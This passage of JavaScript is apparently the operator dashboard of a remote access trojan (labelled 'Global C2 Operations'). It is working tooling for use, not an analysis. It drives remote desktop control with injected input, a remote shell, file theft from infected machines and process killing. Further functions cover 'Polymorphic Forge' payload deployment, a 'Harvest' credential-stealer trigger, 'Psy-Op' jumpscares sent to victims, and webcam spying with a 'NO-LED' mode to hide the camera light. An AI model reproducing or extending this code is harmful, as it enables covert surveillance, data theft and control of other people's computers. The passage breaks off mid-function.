// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function toggleMNKOverlay() {
    mnkOverlayEnabled = !mnkOverlayEnabled;
    const btn = $('btn-mnk-overlay');
    if (btn) {
        btn.classList.toggle('active', mnkOverlayEnabled);
        btn.title = mnkOverlayEnabled ? 'Input Overlay: ON' : 'Input Overlay: OFF';
    }

    const cursor = $('streamCursor');
    if (cursor) cursor.style.display = mnkOverlayEnabled ? 'block' : 'none';

    logIntel(`Input overlay: ${mnkOverlayEnabled ? 'ON' : 'OFF'}`, 'info');
    showModalToast(`Overlay ${mnkOverlayEnabled ? 'ON' : 'OFF'}`, 'info');
}

function updateStreamCursor(x, y) {
    if (!mnkOverlayEnabled) return;
    const cursor = $('streamCursor');
    if (!cursor) return;
    cursor.style.left = x + 'px';
    cursor.style.top  = y + 'px';
    cursor.style.display = 'block';
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STREAM HID (Mouse + Keyboard Injection)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function handleStreamHID(e) {
    if (!streaming || !currentTargetId) return;

    const img = $('desktopViewImg');
    if (!img) return;
    const rect = img.getBoundingClientRect();

    let nx, ny;
    if (img.naturalWidth && img.naturalHeight) {
        const imgRatio = img.naturalWidth / img.naturalHeight;
        const boxRatio = rect.width / rect.height;

        let renderedWidth  = rect.width;
        let renderedHeight = rect.height;
        let offsetX = 0, offsetY = 0;

        if (imgRatio > boxRatio) {
            renderedHeight = rect.width / imgRatio;
            offsetY = (rect.height - renderedHeight) / 2;
        } else {
            renderedWidth  = rect.height * imgRatio;
            offsetX = (rect.width - renderedWidth) / 2;
        }

        const rx = (e.clientX - rect.left - offsetX) / renderedWidth;
        const ry = (e.clientY - rect.top  - offsetY) / renderedHeight;
        nx = Math.max(0, Math.min(1, rx));
        ny = Math.max(0, Math.min(1, ry));
    } else {
        nx = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
        ny = Math.max(0, Math.min(1, (e.clientY - rect.top)  / rect.height));
    }

    const x = Math.round(nx * 10000);
    const y = Math.round(ny * 10000);
    const btn = e.button === 0 ? 'left' : (e.button === 2 ? 'right' : 'middle');

    if (e.type === 'mousemove') {
        const now = Date.now();
        if ((now - (handleStreamHID._lastMove || 0)) < 16) return;
        handleStreamHID._lastMove = now;
        safeSend({ t: 'mm', x, y, w: 10000, h: 10000 });
        // Draw cursor overlay at position in container space
        updateStreamCursor(
            rect.left + nx * rect.width - $('streamCanvas').getBoundingClientRect().left,
            rect.top  + ny * rect.height - $('streamCanvas').getBoundingClientRect().top
        );
    } else if (e.type === 'mousedown') {
        safeSend({ t: 'mc', b: btn, p: 1 });
    } else if (e.type === 'mouseup') {
        safeSend({ t: 'mc', b: btn, p: 0 });
    }
}

// Keyboard forwarding — called from DOMContentLoaded listener
function handleStreamKeyboard(e) {
    // Don't intercept if user is typing in an input inside the modal
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) return;

    // Prevent browser shortcuts from firing
    if (['F5', 'F12', 'F11'].includes(e.key)) return;

    e.preventDefault();
    safeSend({ t: 'kd', k: e.key });
}

function handleStreamKeyboardUp(e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) return;
    safeSend({ t: 'ku', k: e.key });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// SHELL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function handleShellKey(e) {
    const input = $('shellInput');
    if (!input) return;

    if (e.key === 'Enter') {
        const cmd = input.value.trim();
        if (!cmd) return;
        e.preventDefault();
        shellHistory.unshift(cmd);
        shellHistoryIdx = -1;
        input.value = '';
        appendShellLine(`<span style="color:var(--accent-teal)">ω ~&gt;</span> <span style="color:#fff">${escHtml(cmd)}</span>`);
        // Send with both t and type fields
        safeSend({ t: 'shell', type: 'shell', c: cmd });
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        shellHistoryIdx = Math.min(shellHistoryIdx + 1, shellHistory.length - 1);
        input.value = shellHistory[shellHistoryIdx] || '';
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        shellHistoryIdx = Math.max(shellHistoryIdx - 1, -1);
        input.value = shellHistoryIdx < 0 ? '' : (shellHistory[shellHistoryIdx] || '');
    }
}

function handleShellResponse(output) {
    if (!output) return;
    const lines = String(output).split('\n').map(ln =>
        `<span style="color:${ln.trim() ? '#c8ffc8' : 'var(--text-muted)'}">${escHtml(ln)}</span>`
    ).join('\n');
    appendShellLine(lines);
    logIntel(`Shell response (${String(output).length} bytes)`, 'info');
}

function appendShellLine(html) {
    const out = $('shellOutput');
    if (!out) return;
    const line = document.createElement('div');
    line.innerHTML = html;
    out.appendChild(line);
    out.scrollTop = out.scrollHeight;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// FILE EXPLORER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function navigatePath() {
    const path = $('filePath')?.value || 'C:\\';
    navigateTo(path);
}

function navigateTo(path) {
    if (filePathHistory[fileHistoryIdx] !== path) {
        filePathHistory = filePathHistory.slice(0, fileHistoryIdx + 1);
        filePathHistory.push(path);
        fileHistoryIdx = filePathHistory.length - 1;
    }
    const backBtn = $('fileBackBtn');
    if (backBtn) backBtn.disabled = fileHistoryIdx <= 0;
    const pathInput = $('filePath');
    if (pathInput) pathInput.value = path;
    const list = $('fileList');
    if (list) list.innerHTML = `<div style="padding:2rem;text-align:center;color:var(--text-muted)">Loading ${escHtml(path)}…</div>`;
    // Send with both t and type fields
    safeSend({ t: 'ls', type: 'ls', path });
}

function fileBack() {
    if (fileHistoryIdx > 0) {
        fileHistoryIdx--;
        const path = filePathHistory[fileHistoryIdx];
        const pathInput = $('filePath');
        if (pathInput) pathInput.value = path;
        safeSend({ t: 'ls', type: 'ls', path });
        const backBtn = $('fileBackBtn');
        if (backBtn) backBtn.disabled = fileHistoryIdx <= 0;
    }
}

function renderFileList(files, path) {
    const list = $('fileList');
    if (!list) return;

    if (files.length === 0) {
        list.innerHTML = `<div style="padding:2rem;text-align:center;color:var(--text-muted)">Directory is empty.</div>`;
        return;
    }

    const sorted = [...files].sort((a, b) => {
        if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
        return a.name.localeCompare(b.name);
    });

    list.innerHTML = sorted.map(f => {
        const isDir  = f.type === 'dir';
        const size   = isDir ? '' : formatBytes(f.size);
        const dirIcon  = `<svg class="file-item-icon" viewBox="0 0 24 24" fill="${isDir ? 'rgba(255,165,2,0.7)' : 'none'}" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>`;
        const fileIcon = `<svg class="file-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>`;
        const icon = isDir ? dirIcon : fileIcon;
        const fullPath = (path.endsWith('\\') ? path : path + '\\') + f.name;
        const clickAttr = isDir ? `onclick="navigateTo('${escAttr(fullPath)}')"` : '';
        const dlBtn = !isDir
            ? `<button class="file-item-dl" onclick="downloadFile('${escAttr(fullPath)}',event)">↓</button>`
            : `<span style="width:24px"></span>`;
        return `
        <div class="file-item ${isDir ? 'dir' : ''}" ${clickAttr}>
            ${icon}
            <span class="file-item-name" title="${escHtml(f.name)}">${escHtml(f.name)}</span>
            <span class="file-item-size">${size}</span>
            <span class="file-item-mod">${escHtml(f.mod || '')}</span>
            ${dlBtn}
        </div>`;
    }).join('');
}

const _fileChunks = {};

function downloadFile(path, e) {
    if (e) e.stopPropagation();
    logIntel(`Downloading: ${path}`, 'info');
    safeSend({ t: 'download', type: 'download', path });
}

function receiveFileChunk(name, b64data) {
    if (!_fileChunks[name]) _fileChunks[name] = [];
    _fileChunks[name].push(b64data);
}

function finaliseFileDownload(name) {
    const chunks = _fileChunks[name];
    if (!chunks) return;
    const raw = chunks.join('');
    const bin = atob(raw);
    const arr = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    const blob = new Blob([arr]);
    const url  = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = name; a.click();
    URL.revokeObjectURL(url);
    delete _fileChunks[name];
    logIntel(`File downloaded: ${name}`, 'ok');
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// TASK MANAGER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

let _processData = [];

function startProcessRefresh() {
    refreshProcessList();
    _procRefreshInterval = setInterval(refreshProcessList, 3000);
}

function stopProcessRefresh() {
    if (_procRefreshInterval) { clearInterval(_procRefreshInterval); _procRefreshInterval = null; }
}

function refreshProcessList() {
    if (!currentTargetId) return;
    safeSend({ t: 'get_procs', type: 'get_procs' });
}

function renderProcessList(procs) {
    _processData = procs;
    const tbody = $('procTableBody');
    const count = $('procCount');
    if (!tbody) return;

    if (count) count.textContent = `${procs.length} processes`;

    // Apply filter
    const filter = ($('procFilter')?.value || '').toLowerCase();
    let filtered = filter ? procs.filter(p => (p.name || '').toLowerCase().includes(filter)) : procs;

    // Sort
    filtered = [...filtered].sort((a, b) => {
        const va = a[_procSortCol] ?? '';
        const vb = b[_procSortCol] ?? '';
        const cmp = typeof va === 'number' ? va - vb : String(va).localeCompare(String(vb));
        return _procSortAsc ? cmp : -cmp;
    });

    tbody.innerHTML = filtered.map(p => {
        const cpuPct = Math.min(100, p.cpu || 0);
        const cpuColor = cpuPct > 50 ? 'var(--accent-red)' : cpuPct > 20 ? 'var(--accent-amber)' : 'var(--accent-teal)';
        return `
        <tr>
            <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--text-muted)">${p.pid}</td>
            <td style="font-size:0.82rem;color:var(--text-primary);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(p.name || '')}</td>
            <td>
                <div style="display:flex;align-items:center;gap:6px">
                    <div style="width:50px;height:4px;background:rgba(255,255,255,0.08);border-radius:2px;overflow:hidden">
                        <div style="height:100%;width:${cpuPct}%;background:${cpuColor};border-radius:2px;transition:width 0.5s"></div>
                    </div>
                    <span style="font-size:0.72rem;color:${cpuColor};font-family:monospace">${p.cpu}%</span>
                </div>
            </td>
            <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--text-secondary)">${p.mem} MB</td>
            <td style="font-size:0.72rem;color:var(--text-muted)">${escHtml(p.status || '')}</td>
            <td>
                <button class="btn" style="padding:0.25rem 0.6rem;font-size:0.72rem;background:rgba(255,71,87,0.1);border-color:rgba(255,71,87,0.3);color:var(--accent-red)"
                    onclick="endTask(${p.pid}, '${escAttr(p.name || '')}')">End</button>
            </td>
        </tr>`;
    }).join('');
}

function endTask(pid, name) {
    if (!currentTargetId) { showModalToast('No node selected', 'err'); return; }
    if (!confirm(`End process: ${name} (PID ${pid})?`)) return;
    safeSend({ t: 'kill_proc', type: 'kill_proc', pid });
    logIntel(`Killing PID ${pid} (${name}) on ${shortId(currentTargetId)}`, 'warn');
    showModalToast(`Killing ${name}`, 'warn');
}

function sortProcs(col) {
    if (_procSortCol === col) {
        _procSortAsc = !_procSortAsc;
    } else {
        _procSortCol = col;
        _procSortAsc = col === 'name';
    }
    // Update sort header indicators
    document.querySelectorAll('.proc-sort-btn').forEach(btn => {
        const c = btn.dataset.col;
        btn.style.color = c === _procSortCol ? 'var(--accent-blue)' : '';
    });
    renderProcessList(_processData);
}

function filterProcs() {
    renderProcessList(_processData);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// SYSTEM INTEL PANEL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function populateIntelPanel() {
    const panel = $('intelPanel');
    if (!panel || !currentTargetData) return;
    const specs = currentTargetData.specs || {};
    const id    = currentTargetData.hostname || currentTargetData.id || '—';

    const fields = [
        { label: 'Node ID',    value: id },
        { label: 'Status',     value: currentTargetData.status || 'Active' },
        { label: 'IP Address', value: specs.ip    || '—' },
        { label: 'Username',   value: specs.user  || '—' },
        { label: 'Hostname',   value: specs.hostname || '—' },
        { label: 'OS',         value: specs.os    || '—' },
        { label: 'CPU',        value: specs.cpu   || '—' },
        { label: 'RAM',        value: specs.ram   || '—' },
        { label: 'Disk',       value: specs.disk  || '—' },
        { label: 'GPU',        value: specs.gpu   || '—' },
        { label: 'Monitors',   value: (specs.monitors || []).join(', ') || '—', full: true },
        { label: 'Drives',     value: (specs.drives   || []).join('  ') || '—' },
    ];

    panel.innerHTML = fields.map(f => `
        <div class="intel-field${f.full ? ' full' : ''}">
            <div class="intel-field-label">${escHtml(f.label)}</div>
            <div class="intel-field-value">${escHtml(String(f.value))}</div>
        </div>`).join('');
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// NAVIGATION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const viewMeta = {
    overview: { eyebrow: 'Global C2 Operations',    title: 'Command Overview' },
    nodes:    { eyebrow: 'Active Infrastructure',   title: 'Tactical Node Grid' },
    intel:    { eyebrow: 'Event Monitor',           title: 'Activity Stream' },
};

function switchView(viewId) {
    document.querySelectorAll('.nav-link').forEach(el => {
        el.classList.toggle('active', el.id === `nav-${viewId}`);
    });
    const meta = viewMeta[viewId] || viewMeta.overview;
    setText('viewEyebrow', meta.eyebrow);
    setText('viewTitle',   meta.title);

    const cardsGrid   = $('nodeCardsGrid');
    const tableWrap   = $('nodeTableWrap');
    const intelStream = $('intel');

    if (viewId === 'overview') {
        if (cardsGrid)   cardsGrid.style.display = '';
        if (tableWrap)   tableWrap.style.display  = 'none';
        if (intelStream) intelStream.style.display = '';
        window.scrollTo({ top: 0, behavior: 'smooth' });
    } else if (viewId === 'nodes') {
        if (cardsGrid)   cardsGrid.style.display  = 'none';
        if (tableWrap)   tableWrap.style.display  = '';
        if (intelStream) intelStream.style.display = '';
        window.scrollTo({ top: 0, behavior: 'smooth' });
    } else if (viewId === 'intel') {
        if (cardsGrid)   cardsGrid.style.display  = 'none';
        if (tableWrap)   tableWrap.style.display  = 'none';
        if (intelStream) { intelStream.style.display = ''; intelStream.scrollIntoView({ behavior: 'smooth' }); }
    }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// FAKE TELEMETRY
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function startFakeTelemetry() {
    updateFakeTelemetry();
    setInterval(updateFakeTelemetry, 2800);
}

function updateFakeTelemetry() {
    const load   = (Math.random() * 3 + 0.2).toFixed(1);
    const uplink = (Math.random() * 80 + 5).toFixed(1);
    animateText('serverLoad', `${load}%`);
    animateText('dataUplink', `${uplink} KB/s`);
}

function animateText(id, val) {
    const el = $(id);
    if (!el || el.textContent === val) return;
    el.style.cssText = 'opacity:0.4;transform:translateY(4px);transition:opacity 0.18s,transform 0.18s';
    setTimeout(() => { el.textContent = val; el.style.cssText = 'opacity:1;transform:none;transition:opacity 0.18s,transform 0.18s'; }, 180);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// DEPLOY
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function deployAgent() {
    logIntel('Polymorphic Forge initialising…', 'warn');
    setTimeout(() => {
        logIntel('Payload compiled. Starting download…', 'ok');
        window.location.href = '/api/pyclient';
    }, 600);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STREAM STYLES & MONITOR GRID
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function populateStylesGallery() {
    const gallery = $('stylesGallery');
    if (!gallery) return;
    gallery.innerHTML = '';
    STREAM_STYLES.forEach(style => {
        const item = document.createElement('div');
        item.className = 'style-item';
        if (style === currentStreamStyle) item.classList.add('active');
        item.onclick = e => { e.stopPropagation(); setStreamStyle(style); };
        item.innerHTML = `
            <div class="style-item-preview" style="background:${getStyleColor(style)}"></div>
            <div class="style-item-name">${style}</div>`;
        gallery.appendChild(item);
    });
}

function getStyleColor(style) {
    if (style === 'Standard' || style === 'AnyDesk') return 'var(--accent-teal)';
    if (style === 'Thermal' || style === 'Hot')      return 'linear-gradient(to right,blue,red)';
    if (style === 'Matrix')    return '#00ff41';
    if (style === 'Cyberpunk') return 'linear-gradient(45deg,#f0f,#0ff)';
    if (style === 'NightVision') return '#003300';
    if (style === 'Negative')  return '#fff';
    if (style === 'Golden')    return 'linear-gradient(45deg,#ffd700,#ff8c00)';
    return 'var(--border-default)';
}

function setStreamStyle(style) {
    currentStreamStyle = style;
    const badge = $('activeStyleBadge');
    if (badge) {
        badge.innerText = style;
        badge.className = (style === 'Standard' || style === 'AnyDesk') ? 'badge badge-teal' : 'badge badge-amber';
    }
    document.querySelectorAll('.style-item').forEach(el => {
        el.classList.toggle('active', el.querySelector('.style-item-name').innerText === style);
    });
    logIntel(`Stream Style: ${style}`, 'info');
    safeSend({ t: 'rtc_toggle', type: 'rtc_toggle', action: 'style', value: style });
}

function updateMonitorList(monitors) {
    streamMonitors = monitors;
    const select = $('streamMonitorSelect');
    if (!select) return;
    select.innerHTML = '';
    monitors.forEach(m => {
        const opt = document.createElement('option');
        opt.value = m.id;
        opt.innerText = `${m.name} (${m.res})`;
        select.appendChild(opt);
    });
    if (isGridView) renderMonitorGrid();
}

function toggleGridView() {
    isGridView = !isGridView;
    const mv = $('mainStreamView');
    const gv = $('monitorGridView');
    const gb = $('btn-grid-toggle');
    if (mv) mv.style.display = isGridView ? 'none' : 'block';
    if (gv) gv.style.display = isGridView ? 'grid' : 'none';
    if (gb) gb.classList.toggle('active', isGridView);

    if (streaming) {
        safeSend({ t: 'set_grid', type: 'set_grid', v: isGridView });
    }

    logIntel(isGridView ? 'Multi-Monitor Grid Active' : 'Single Monitor Focus Active', 'info');

    if (isGridView && streaming) {
        // Clear the grid so cells get recreated from incoming frames
        const grid = $('monitorGridView');
        if (grid) grid.innerHTML = '';
    }
}

function renderMonitorGrid() {
    const grid = $('monitorGridView');
    if (!grid || streamMonitors.length === 0) return;
    grid.innerHTML = '';
    streamMonitors.forEach(m => {
        const box = document.createElement('div');
        box.className = 'grid-monitor-box';
        box.innerHTML = `
            <div class="grid-monitor-info"><span>${m.name}</span><span>${m.res}</span></div>
            <img id="grid-monitor-img-${m.id}" style="width:100%;aspect-ratio:16/9;background:#0a0a0a;display:block;object-fit:contain;"/>`;
        box.onclick = () => { $('streamMonitorSelect').value = m.id; changeMonitor(); toggleGridView(); };
        grid.appendChild(box);
    });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// HARVEST & PSY-OPS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function triggerHarvest() {
    if (!currentTargetId) { showModalToast('No node selected for harvest', 'err'); return; }
    const logArea = $('stealerLog');
    if (logArea) logArea.innerHTML = '[INIT] Triggering extraction sequence...\n';
    const hs = $('harvesterStatus');
    if (hs) hs.textContent = '● STATUS: INITIALISING';
    logIntel('Initiating Omega Harvest → ' + shortId(currentTargetId), 'info');
    showModalToast('📦 Harvest initiated', 'info');
    safeSend({ t: 'harvest', type: 'harvest', id: currentTargetId });
}

function appendStealerLog(msg) {
    const logArea = $('stealerLog');
    if (!logArea) return;
    const ts = new Date().toLocaleTimeString('en-GB', { hour12: false });
    logArea.innerHTML += `[${ts}] ${escHtml(msg)}\n`;
    logArea.scrollTop = logArea.scrollHeight;
}

function startJumpscare() {
    const urlEl   = $('jsImgInput');
    const soundEl = $('jsSndInput');
    const url   = urlEl   ? urlEl.value.trim()   : '';
    const sound = soundEl ? soundEl.value.trim() : '';
    if (!currentTargetId) { showModalToast('No node selected', 'err'); return; }
    if (!url) { showModalToast('Enter an image URL first', 'warn'); return; }
    logIntel('Deploying Psy-Op Overlay → ' + shortId(currentTargetId), 'info');
    showModalToast('💥 Jumpscare firing!', 'err');
    safeSend({ t: 'troll', type: 'troll', action: 'jumpscare', image: url, sound });
}

function stopJumpscare() {
    if (!currentTargetId) return;
    logIntel('Terminating Psy-Op → ' + shortId(currentTargetId), 'warn');
    showModalToast('Psy-Op terminated', 'ok');
    safeSend({ t: 'troll', type: 'troll', action: 'stop_js' });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// UTILITIES
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

function shortId(id) { return String(id || '????').replace(/-/g, '').slice(0, 8).toUpperCase(); }
function shortenOS(os) { return String(os).replace('Microsoft Windows','Windows').replace(' Professional',' Pro').replace(' Enterprise',' Ent').slice(0, 20); }
function escHtml(str) { return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;'); }
function escAttr(str) { return String(str).replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
function setText(id, val) { const el = $(id); if (el) el.textContent = String(val); }
function formatBytes(b) {
    if (!b || isNaN(b)) return '';
    const n = Number(b);
    if (n >= 1e9) return (n/1e9).toFixed(1) + ' GB';
    if (n >= 1e6) return (n/1e6).toFixed(1) + ' MB';
    if (n >= 1e3) return (n/1e3).toFixed(1) + ' KB';
    return n + ' B';
}

function osIconSvg(os) {
    const lc = String(os).toLowerCase();
    if (lc.includes('win'))
        return `<svg style="width:16px;height:16px;color:var(--accent-blue);flex-shrink:0" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>`;
    if (lc.includes('mac'))
        return `<svg style="width:16px;height:16px;color:var(--text-secondary);flex-shrink:0" viewBox="0 0 24 24" fill="currentColor"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09z"/></svg>`;
    return `<svg style="width:16px;height:16px;color:var(--text-muted);flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`;
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — CAMERA PiP SYSTEM
// ════════════════════════════════════════════════════════════════════════════════
let _pipCorner    = 'br';    // tl | tr | bl | br
let _pipDragging  = false;
let _pipDragOX    = 0, _pipDragOY = 0;
let _camOn        = false;
let _camNoLed     = true;
let _camLedMode   = true;   // true = reduced (no LED)
let _activeCamIdx = 0;
let _camList      = [];

function initCameraPiP() {
    // Build the PiP element if not already in DOM
    if ($('pip-cam-wrap')) return;

    const wrap = document.createElement('div');
    wrap.id = 'pip-cam-wrap';
    wrap.innerHTML = `
      <div id="pip-cam-header">
        <span id="pip-cam-title">📷 Camera 0</span>
        <div style="display:flex;gap:4px;">
          <button class="pip-btn" id="pip-led-btn"  onclick="toggleCamLed()"   title="LED mode">💡</button>
          <button class="pip-btn" id="pip-snap-btn" onclick="camSnapshot()"    title="Snapshot">📸</button>
          <button class="pip-btn" id="pip-close-btn" onclick="setCamOff()"     title="Close">✕</button>
        </div>
      </div>
      <div id="pip-cam-corners">
        <button class="pip-corner" onclick="setPipCorner('tl')" title="Top Left">↖</button>
        <button class="pip-corner" onclick="setPipCorner('tr')" title="Top Right">↗</button>
        <button class="pip-corner" onclick="setPipCorner('bl')" title="Bottom Left">↙</button>
        <button class="pip-corner" onclick="setPipCorner('br')" title="Bottom Right">↘</button>
      </div>
      <img id="pip-cam-img" src="" alt="Camera" draggable="false">
      <div id="pip-cam-footer">
        <select id="pip-cam-select" onchange="switchCamera(this.value)" style="background:rgba(0,0,0,0.6);border:1px solid rgba(167,139,250,0.3);color:#fff;font-size:10px;padding:2px 4px;border-radius:4px;outline:none;">
          <option value="0">Camera 0</option>
        </select>
        <span id="pip-cam-led-badge" style="font-size:9px;color:var(--accent-teal);padding:0 4px">NO-LED</span>
      </div>`;
    document.body.appendChild(wrap);

    // Drag support
    wrap.addEventListener('mousedown', e => {
        if (e.target.closest('.pip-btn,.pip-corner,select')) return;
        _pipDragging = true;
        _pipCorner   = 'free';
        _pipDragOX   = e.clientX - wrap.getBoundingClientRect().left;
        _pipDragOY   = e.clientY - wrap.getBoundingClientRect().top;
        wrap.style.cursor = 'grabbing';
        e.preventDefault();
    });
    document.addEventListener('mousemove', e => {
        if (!_pipDragging) return;
        wrap.style.left   = (e.clientX - _pipDragOX) + 'px';
        wrap.style.top    = (e.clientY - _pipDragOY) + 'px';
        wrap.style.right  = 'auto';
        wrap.style.bottom = 'auto';
    });
    document.addEventListener('mouseup', () => {
        _pipDragging = false;
        if (wrap) wrap.style.cursor = 'grab';
    });

    setPipCorner('br');
}

function setPipCorner(corner) {
    _pipCorner = corner;
    const wrap  = $('pip-cam-wrap');
    if (!wrap) return;
    wrap.style.left = wrap.style.right = wrap.style.top = wrap.style.bottom = 'auto';
    const margin = '20px';
    if      (corner === 'tl') { wrap.style.top = margin;    wrap.style.left   = margin; }
    else if (corner === 'tr') { wrap.style.top = margin;    wrap.style.right  = margin; }
    else if (corner === 'bl') { wrap.style.bottom = margin; wrap.style.left   = margin; }
    else                      { wrap.style.bottom = margin; wrap.style.right  = margin; }
}

function setCamOn(idx) {
    _camOn = true;
    _activeCamIdx = idx || 0;
    const wrap = $('pip-cam-wrap');
    if (wrap) wrap.style.display = 'flex';
    safeSend({ t: 'cam_on', type: 'cam_on', idx: _activeCamIdx });
    // Enumerate cameras on first open
    safeSend({ t: 'cam_enum', type: 'cam_enum' });
    logIntel(`Camera ${_activeCamIdx} PiP started`, 'ok');
}

function setCamOff() {
    _camOn = false;
    const wrap = $('pip-cam-wrap');
    if (wrap) wrap.style.display = 'none';
    const img = $('pip-cam-img');
    if (img) img.src = '';
    safeSend({ t: 'cam_off', type: 'cam_off' });
    logIntel('Camera PiP stopped', 'info');
}

function switchCamera(idx) {
    _activeCamIdx = parseInt(idx);
    safeSend({ t: 'cam_select', type: 'cam_select', idx: _activeCamIdx });
    const title = $('pip-cam-title');
    if (title) title.textContent = `📷 Camera ${_activeCamIdx}`;
    logIntel(`Switched to camera ${_activeCamIdx}`, 'info');
}

function toggleCamLed() {
    _camLedMode = !_camLedMode;
    safeSend({ t: 'cam_led', type: 'cam_led', v: !_camLedMode });
    const badge = $('pip-cam-led-badge');
    const btn   = $('pip-led-btn');
    if (badge) badge.textContent = _camLedMode ? 'NO-LED' : 'LED-ON';
    if (badge) badge.style.color = _camLedMode ? 'var(--accent-teal)' : 'var(--accent-amber)';
    if (btn)   btn.style.color   = _camLedMode ? '' : 'var(--accent-amber)';
}

function camSnapshot() {
    safeSend({ t: 'cam_snapshot', type: 'cam_snapshot', idx: _activeCamIdx });
}

function handleCamList(cams) {
    _camList = cams;
    const sel = $('pip-cam-select');
    if (!sel) return;
    sel.innerHTML = cams.length > 0
        ? cams.map(c => `<option value="${c.idx}">${c.name}</option>`).join('')
        : '<option value="0">Camera 0</option>';
}

// Binary cam frame → PiP image
function renderCamFrame(buf) {
    const blob = new Blob([buf], { type: 'image/jpeg' });
